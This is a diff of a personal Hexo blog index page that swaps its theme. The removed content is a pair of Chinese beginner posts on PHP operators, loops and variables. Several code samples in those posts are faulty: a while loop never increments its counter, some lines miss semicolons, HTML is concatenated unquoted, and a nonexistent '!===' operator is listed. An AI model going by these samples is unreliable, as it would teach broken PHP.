@@ -1,830 +1,216 @@
-<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+<!doctype html>
 <html lang="en">
+
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+<script type="text/javascript" 
+src="//cdnjs.cloudflare.com/ajax/libs/prettify/r298/prettify.min.js">
+</script>
+<link href=  "/plugins/code-theme/tomorrow.css" type="text/css" rel="stylesheet" />
+<link rel="stylesheet" href="/plugins/github-markdown.css">
+
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 4.2.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
-
-
-<script id="hexo-configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    hostname: new URL('http://moMaxX.github.io').hostname,
-    root: '/',
-    scheme: 'Muse',
-    version: '7.7.1',
-    exturl: false,
-    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
-    copycode: {"enable":false,"show_result":false,"style":null},
-    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
-    bookmark: {"enable":false,"color":"#222","save":"auto"},
-    fancybox: false,
-    mediumzoom: false,
-    lazyload: false,
-    pangu: false,
-    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
-    algolia: {
-      appID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    },
-    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
-    path: 'search.xml',
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
-  };
-</script>
-
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Momax&#39;s blog">
-<meta property="og:url" content="http://momaxx.github.io/page/2/index.html">
-<meta property="og:site_name" content="Momax&#39;s blog">
-<meta property="og:locale" content="en_US">
-<meta property="article:author" content="moMaxX">
-<meta name="twitter:card" content="summary">
-
-<link rel="canonical" href="http://momaxx.github.io/page/2/">
-
-
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome: true,
-    isPost: false
-  };
-</script>
-
-  <title>Momax's blog</title>
+  <meta charset="UTF-8" name="viewport" content="width=device-width,initial-scale=1">
   
+    
+    
+      <link rel="stylesheet" href="/css/legend.css">
+    
+  
+<meta name="generator" content="Hexo 4.2.0"></head>
 
+<body id="body-home-bg">
+<div id="layout-content">
+  <div id="menu-outer-home">
+  <div id="menu-inner">
+    
+    
+    <div id="site-title">
+      Momax's blog
+    </div>
+    
 
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-meta">
-
+     
     <div>
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Momax's blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
+    
+      
+      <a href="/">首页</a>
+      
+    
+      
+      <a href="/archives">归档</a>
+      
+    
     </div>
   </div>
+</div> 
+  <div id="content-outer">
+    <div id="content-inner">
+      
+      
+  
 
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="Toggle navigation bar">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
-  </div>
+<video id="bgvideo" autoplay playsinline loop poster=/images/background.png>
+  <source src=http://cdn.calm.com/scenes/scene-Qqkzy9k7Eo.mp4?v=1418162238190 type="video/mp4">
+</video>
+
+
+
+
+  <div id="play-button" >
+  <img id="play-img" src="/images/playback_play.png"></img>
 </div>
-
-
-<nav class="site-nav">
-  
-  <ul id="menu" class="menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
-
-  </li>
-      <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
-        </a>
-      </li>
-  </ul>
-
-</nav>
-  <div class="site-search">
-    <div class="popup search-popup">
-    <div class="search-header">
-  <span class="search-icon">
-    <i class="fa fa-search"></i>
-  </span>
-  <div class="search-input-container">
-    <input autocomplete="off" autocorrect="off" autocapitalize="none"
-           placeholder="Searching..." spellcheck="false"
-           type="text" id="search-input">
-  </div>
-  <span class="popup-btn-close">
-    <i class="fa fa-times-circle"></i>
-  </span>
-</div>
-<div id="search-result"></div>
-
-</div>
-<div class="search-pop-overlay"></div>
-
-  </div>
-</div>
-    </header>
-
-    
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content">
-            
-
-  <div class="posts-expand">
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://momaxx.github.io/2020/04/14/PHP%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%BC%B9/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="moMaxX">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Momax's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/04/14/PHP%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%BC%B9/" class="post-title-link" itemprop="url">PHP入门学习第三弹</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2020-04-14 00:07:48 / Modified: 00:07:55" itemprop="dateCreated datePublished" datetime="2020-04-14T00:07:48+08:00">2020-04-14</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>@<a href="这里写目录标题">TOC</a></p>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上次学习了PHP语言的常量内容，并对之前的变量内容进行了补充，这次来说一下运算符以及一些语句</p>
-<h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>运算符就是对于数据进行运算处理的符号。</p>
-<h2 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h2><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>算术运算符有：<strong>“+”</strong>、<strong>“-”</strong>、<strong>“*”</strong>、<strong>“/”</strong>、<strong>“%”</strong>、<strong>“++”</strong>、<strong>“–”</strong>这几类</p>
-<h4 id=""><a href="#" class="headerlink" title="+"></a>+</h4><p><strong>“+”</strong>就单纯的是个加号，表示两个数据相加的结果<br><img src="https://img-blog.csdnimg.cn/20200413180056745.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>在这里我其实有一个疑问，就是为什么字符串在单纯的就是这样一个＋号表达式里会被认为是0处理？</strong><br>关于这个，我在网上进行了查找，找到了问题的答案，就是说字符串在与整数相加时，有着如下的转换规律：</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">'1aaa' =&gt; 1</span><br><span class="line">'11aaa' =&gt; 11</span><br><span class="line">'222asdsa' =&gt; 222</span><br><span class="line">'aaaaa1'=&gt;0</span><br></pre></td></tr></table></figure>
-<p>就是说字符串开头没有数值的话，会按0处理，而有数值的话会转换成相应的数值，即：<br><img src="https://img-blog.csdnimg.cn/20200413181104441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h4 id="-1"><a href="#-1" class="headerlink" title="-"></a>-</h4><p><strong>“-”</strong>其实和上面说的一样。这里不进行过多的记录了就。<br><img src="https://img-blog.csdnimg.cn/20200413181303700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>不过<strong>“-”</strong> 还有一个意思，就是取反<br><img src="https://img-blog.csdnimg.cn/20200413223853706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h4 id="-2"><a href="#-2" class="headerlink" title="*"></a>*</h4><p><img src="https://img-blog.csdnimg.cn/20200413181432238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h4 id="-3"><a href="#-3" class="headerlink" title="/"></a>/</h4><p><img src="https://img-blog.csdnimg.cn/2020041318160076.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h4 id="-4"><a href="#-4" class="headerlink" title="%"></a>%</h4><p><strong>“%”</strong> 和别的语言其实一样，就是取余。<br><img src="https://img-blog.csdnimg.cn/20200413181712681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h4 id="-5"><a href="#-5" class="headerlink" title="++"></a>++</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="number">1</span>;</span><br><span class="line"><span class="comment">//echo $a++;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> ++$a;</span><br></pre></td></tr></table></figure>
-<p>对于这两种方法，输出的结果是不一样的。前加加表示先加，后加加表示后加，因此结果不一样，不过如果在前面先加加，在输出的话值是一样的。<br>不过如果上面的代码不把第三行注释掉的话，输出的结果就会变成  1    3。因为在<code>$a++</code>这一句中输出了a的值，再对a进行加加。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="number">1</span>;</span><br><span class="line"><span class="comment">#$a++;</span></span><br><span class="line">++$a;</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure>
-<p>这样子输出的结果是一样的。<br>总的来说，就是前加加是先加，后返回；后加加是先返回后加。</p>
-<h4 id="–"><a href="#–" class="headerlink" title="–"></a>–</h4><p><strong>“–”</strong> 和<strong>“++”</strong> 效果一样，就不多说了。<br><strong>注意：++和–是对于变量而言的</strong></p>
-<h3 id="字符串运算符"><a href="#字符串运算符" class="headerlink" title="字符串运算符"></a>字符串运算符</h3><p>字符串运算符是一个<strong>“.”</strong>，用于连接字符串。<br><img src="https://img-blog.csdnimg.cn/20200413223625893.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><h4 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h4><p>有<strong>“=”</strong>、<strong>“-”</strong>、<strong>“+=”</strong>、<strong>“-=”</strong>、<strong>“*=”</strong>、<strong>“/=”</strong>、<strong>“.=”</strong>、<strong>“%=”</strong> 几类。</p>
-<h5 id="-6"><a href="#-6" class="headerlink" title="="></a>=</h5><p>可以把它看成是一个数学中的等于号，只不过叫做赋值，<br>比如：<code>$a=1</code>，就是指把 <strong>“1”</strong> 的值赋给 <strong>“变量a”</strong>。</p>
-<h5 id="-7"><a href="#-7" class="headerlink" title="-"></a>-</h5><p>在上面说过了，就是指取相反数。</p>
-<h5 id="、-、-、-、-、"><a href="#、-、-、-、-、" class="headerlink" title="+=、-=、*=、/=、.=、%="></a>+=、-=、*=、/=、.=、%=</h5><p>这几种的意思其实是一样的。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a+=<span class="number">1</span>;<span class="comment">//$a=$a+1</span></span><br><span class="line">$a-=<span class="number">1</span>;<span class="comment">//$a=$a-1</span></span><br><span class="line">$a*=<span class="number">1</span>;<span class="comment">//$a=$a*1</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><h4 id="分类-2"><a href="#分类-2" class="headerlink" title="分类"></a>分类</h4><p><strong>==（等于）</strong>、<strong>===（全等）</strong>、<strong>！=（不等于）&lt;&gt;</strong>、<strong>！===（不全等）</strong>、<strong>&gt;</strong>、<strong>&lt;</strong>、<strong>&gt;=</strong>、<strong>&lt;=</strong>。</p>
-<h5 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="number">1</span>;</span><br><span class="line">$b=<span class="string">'1'</span>;</span><br><span class="line">var_dump($a==$b)<span class="comment">//输出blooen true</span></span><br><span class="line">var_dump($a===$b)<span class="comment">//输出blooen false</span></span><br><span class="line">var_dump($a!=$b)<span class="comment">//输出blooen false</span></span><br><span class="line">var_dump($a&lt;&gt;$b)<span class="comment">//输出blooen false</span></span><br><span class="line">var_dump($a!==$b)<span class="comment">//输出blooen true</span></span><br><span class="line">var_dump($a&gt;$b)<span class="comment">//输出blooen false</span></span><br><span class="line">var_dump($a&gt;=$b)<span class="comment">//输出blooen true</span></span><br><span class="line">var_dump($a&lt;=$b)<span class="comment">//输出blooen true</span></span><br><span class="line">var_dump($a&lt;$b)<span class="comment">//输出blooen false</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h5 id="规定"><a href="#规定" class="headerlink" title="规定"></a>规定</h5><p>在对数据数进行比较操作时，输出的都是布尔类型数据。<br>在PHP中用<code>echo</code>输出布尔类型数据时，</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">true</span>;<span class="comment">//输出1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">false</span><span class="comment">//无输出</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>可以用上面说过的<code>var_dump()</code>来输出。</p>
-<h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><h4 id="分类-3"><a href="#分类-3" class="headerlink" title="分类"></a>分类</h4><p>就是几种<strong>与、或、非、异或</strong>。</p>
-<h5 id="逻辑运算规则"><a href="#逻辑运算规则" class="headerlink" title="逻辑运算规则"></a>逻辑运算规则</h5><p>运算的数值都是布尔类型，如果不是会自动转换为布尔类型，再进行运算。输出的也是布尔类型。</p>
-<h6 id="认为是布尔类型是false的值"><a href="#认为是布尔类型是false的值" class="headerlink" title="认为是布尔类型是false的值"></a>认为是布尔类型是false的值</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、布尔值false</span><br><span class="line"><span class="number">2</span>、<span class="number">0</span></span><br><span class="line"><span class="number">3</span>、浮点型<span class="number">0.0</span></span><br><span class="line"><span class="number">4</span>、空白字符串和字符串<span class="number">0</span></span><br><span class="line"><span class="number">5</span>、没有成员的数组</span><br><span class="line"><span class="number">6</span>、NULL</span><br></pre></td></tr></table></figure>
-<h5 id="逻辑运算符的使用"><a href="#逻辑运算符的使用" class="headerlink" title="逻辑运算符的使用"></a>逻辑运算符的使用</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">true</span>;</span><br><span class="line">$b=<span class="keyword">false</span>;</span><br><span class="line">var_dump($a &amp;&amp; $b)<span class="comment">//与运算 输出false</span></span><br><span class="line">var_dump($a <span class="keyword">and</span> $b)<span class="comment">//与运算 输出false</span></span><br><span class="line">var_dump($a <span class="keyword">or</span> $b)<span class="comment">//或运算 输出true</span></span><br><span class="line">var_dump($a || $b)<span class="comment">//或运算 输出true</span></span><br><span class="line">var_dump(!$b)<span class="comment">//非运算 输出true</span></span><br><span class="line">var_dump($a <span class="keyword">xor</span> $b)<span class="comment">//异或运算 输出true</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h3 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h3><h4 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h4><p>对操作数中的每一个二进制位进行运算。</p>
-<h3 id="其他运算符"><a href="#其他运算符" class="headerlink" title="其他运算符"></a>其他运算符</h3><h4 id="-8"><a href="#-8" class="headerlink" title="?:"></a>?:</h4><p>三元运算符<br>使用格式：<code>表达式1 ? 表达式2 : 表达式3；</code><br>运算规则：<br><strong>如果表达式1为true，那么执行表达式2，否则执行表达式3</strong>。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">true</span> ? <span class="number">20</span> : <span class="number">10</span></span><br><span class="line"><span class="keyword">echo</span> $a;<span class="comment">//输出20</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h4 id="-9"><a href="#-9" class="headerlink" title="``"></a>``</h4><p>用途：<strong>可以将系统的命令放在代码里执行</strong><br>但是由于跨平台原因，很少用到，（个人感觉还有涉及到安全问题）。</p>
-<h4 id="-10"><a href="#-10" class="headerlink" title="@"></a>@</h4><p>用途： <strong>屏蔽表达式可能出现的错误</strong><br>注意是表达式。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> $a;<span class="comment">//因为没有对变量a赋值，因此会报错</span></span><br><span class="line">@<span class="keyword">echo</span> $a;<span class="comment">//echo不是表达式，会报错</span></span><br><span class="line"><span class="keyword">echo</span> @$a;<span class="comment">//输出null</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h4 id="gt-、-gt-、instanceof"><a href="#gt-、-gt-、instanceof" class="headerlink" title="=&gt; 、-&gt; 、instanceof"></a>=&gt; 、-&gt; 、instanceof</h4><p>三种运算符还没有接触，之后往后面深入学习之后，会补充回来。</p>
-<h1 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h1><h2 id="while循环语句"><a href="#while循环语句" class="headerlink" title="while循环语句"></a>while循环语句</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$i=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>($i&lt;=<span class="number">10</span>)&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"while循环语句"</span>.&lt;br /&gt;<span class="comment">//输出十次“while循环语句”，换行输出</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="do-while-循环语句"><a href="#do-while-循环语句" class="headerlink" title="do while 循环语句"></a>do while 循环语句</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$i=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"do while循环语句"</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"\n"</span></span><br><span class="line">  $i++;</span><br><span class="line">&#125;<span class="keyword">while</span>($i&lt;=<span class="number">10</span>)<span class="comment">//换行输出十次“do while循环语句”</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h3 id="for-循环语句"><a href="#for-循环语句" class="headerlink" title="for 循环语句"></a>for 循环语句</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($a=<span class="number">1</span>; $a&lt;=<span class="number">10</span>; $a++)&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"for循环语句"</span>.&lt;br /&gt;<span class="comment">//换行输出十次“for循环语句”</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h3 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h3><p><img src="https://img-blog.csdnimg.cn/2020041400063849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>第三弹大概就学了这么多，等下次再总结其他的，<strong>加油！！！</strong></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://momaxx.github.io/2020/03/27/PHP%E5%9F%BA%E6%9C%AC%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="moMaxX">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Momax's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/03/27/PHP%E5%9F%BA%E6%9C%AC%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">PHP基本入门学习</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-03-27 23:22:05" itemprop="dateCreated datePublished" datetime="2020-03-27T23:22:05+08:00">2020-03-27</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-03-28 19:34:37" itemprop="dateModified" datetime="2020-03-28T19:34:37+08:00">2020-03-28</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>前言：上一篇博客介绍了PHP的环境搭建以及工具的使用，这次就来记录一下自己刚进行PHP学习学到的东西</p>
-<h2 id="PHP的变量"><a href="#PHP的变量" class="headerlink" title="PHP的变量"></a>PHP的变量</h2><p>所谓变量，就是PHP语言中用来存储信息的“容器”。<br>如：输入一个x并进行赋值，</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $x=<span class="number">5</span>;</span><br><span class="line">  <span class="keyword">echo</span> $x;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这样输出的就是5。<br><strong>PHP语言变量命名规则</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">变量以 $ 符号开始，后面跟着变量的名称</span><br><span class="line">变量名必须以字母或者下划线字符开始</span><br><span class="line">变量名只能包含字母数字字符以及下划线（A-z、0-9 和 _ ）</span><br><span class="line">变量名不能包含空格</span><br><span class="line">变量名是区分大小写的（<span class="variable">$y</span> 和 <span class="variable">$Y</span> 是两个不同的变量）</span><br></pre></td></tr></table></figure>
-<p><strong>需注意PHP和PHP变量都是区分大小写的</strong><br><strong>PHP变量的作用域</strong><br>变量的作用域就是指脚本中变量可别引用的部分，在PHP中有四大作用域</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">local</span></span><br><span class="line">global</span><br><span class="line">static</span><br><span class="line">parameter</span><br></pre></td></tr></table></figure>
-<p><strong>global</strong><br>变量有局部变量和全局变量两大类，在一个函数中通过简单的输出全局变量是无法做到的。如：</p>
